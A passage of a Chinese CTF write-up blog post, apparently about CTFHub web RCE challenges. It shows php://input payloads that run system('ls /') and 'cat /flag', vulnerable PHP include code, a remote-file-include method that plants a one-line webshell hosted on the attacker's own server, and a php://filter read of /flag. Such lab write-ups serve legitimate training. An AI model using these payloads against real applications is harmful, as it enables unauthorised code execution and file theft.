+
+<p>通过<code>&lt;?php system(&quot;ls /&quot;);?&gt;</code>进行目录遍历</p>
+<p><img src="/2022/02/15/CTFHub-Web-RCE/input1.png" alt="input1"></p>
+<p>然后直接查看flag文件得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;cat /flag_26452&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/15/CTFHub-Web-RCE/input2.png" alt="input2"></p>
+<h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p>通过源码发现存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;</span><br><span class="line">        include $_GET[&quot;file&quot;];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don&#x27;t have shell, how to get flag?&lt;br&gt;</span><br><span class="line">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过phpinfo源码发现我们还是可以用input进行读取，但是这题实际上不是这个思路的。这题主要要我们通过公网的服务器上的一个文件，来进行getshell读取flag.</p>
+<p>我们可以写一个一句话，放到自己的服务器上，再通过<code>?file=文件的地址</code>，成功显示，提供蚁剑，连接一句话的密码。</p>
+<h2 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;</span><br><span class="line">        include($_GET[&quot;file&quot;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don&#x27;t have shell, how to get flag? &lt;br&gt;</span><br><span class="line">flag in &lt;code&gt;/flag&lt;/code&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这题还是利用php协议，但是不是之前的input，而是filter</p>
+<p>题目已经说了存在于/flag中，因此直接用?file=php://filter/read=convert.base64-encode/resource=/flag就可以读到flag</p>
+
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://10vexh.top/2022/02/15/CTFHub-Web-RCE/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://10vexh.top/2022/02/15/CTFHub-Web-RCE/";
+            const title         = "「CTFHub-Web-RCE」";
+            const excerpt       = `CTFHub-Web-RCE​        RCE(Remote Command/Code Execute),远程命令执行ping和远程代码执行evel。一般出现在常见的网络设备，防火墙，路由器等web管理界面。一般是会给用户一个可...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    
+                </div>
+                <div class="pull-date">
+                <span>最后编辑：2022-02-20</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" CTFHub-Web-HTTP协议" href="/2022/02/13/CTFHub-Web-HTTP协议/">&lt; 上一篇</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" CTFHub-Web-文件上传" href="/2022/02/15/CTFHub-Web-文件上传/">下一篇 &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.webp" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">水至清则无鱼</p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                7
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                0
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                0
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFHub-Web-RCE"><span class="toc-text">CTFHub-Web-RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#eval%E6%89%A7%E8%A1%8C"><span class="toc-text">eval执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4cat"><span class="toc-text">过滤cat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-text">过滤目录分隔符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-text">过滤运算符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4%E7%BB%83%E4%B9%A0"><span class="toc-text">综合过滤练习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="toc-text">远程包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-text">读取源代码</span></a></li></ol></li></ol>
+    </div>
+</aside>
+                
+                
+
+            
+                
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/02/15/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fa  fa-book"></i> CTFHub-Web-文件上传</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/02/15/CTFHub-Web-RCE/"><i class="fa  fa-book"></i> CTFHub-Web-RCE</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/02/13/CTFHub-Web-HTTP%E5%8D%8F%E8%AE%AE/"><i class="fa  fa-book"></i> CTFHub-Web-HTTP协议</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/01/24/CTFHub-Web-SSRF/"><i class="fa  fa-book"></i> CTFHub-Web-SSRF</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/01/03/sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fa  fa-book"></i> sql-lab刷题记录</a>
+            
+          
+        
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/10vexh"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2022 10vexh's Blog. 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by 10vexh.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://unpkg.com/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://unpkg.com/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="https://unpkg.com/meting@2/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://unpkg.com/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
